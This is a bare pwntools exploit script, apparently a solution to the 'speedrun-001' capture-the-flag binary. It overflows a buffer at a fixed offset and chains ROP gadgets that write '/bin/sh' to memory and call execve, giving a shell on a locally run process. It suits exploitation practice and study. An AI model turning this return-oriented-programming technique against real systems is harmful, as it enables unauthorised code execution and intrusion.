from pwn import *

elf = context.binary = ELF('./speedrun-001')

offset = 1032

rop = ROP(elf)
rop.raw(b'A' * offset)
rop.raw(rop.find_gadget(['pop rdx', 'ret'])[0])
rop.raw(b'/bin/sh\x00')
rop.raw(rop.find_gadget(['pop rax', 'ret'])[0])
rop.raw(0x6b6000)
rop.raw(0x000000000048d251)
rop.raw(rop.find_gadget(['pop rax', 'ret'])[0])
rop.raw(59)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(0x6b6000)
rop.raw(rop.find_gadget(['pop rsi', 'ret'])[0])
rop.raw(0)
rop.raw(rop.find_gadget(['pop rdx', 'ret'])[0])
rop.raw(0)
rop.raw(rop.find_gadget(['syscall']))

print(rop.dump())

p = process()

p.sendafter('?\n', rop.chain())

print(p.recv())

p.interactive()
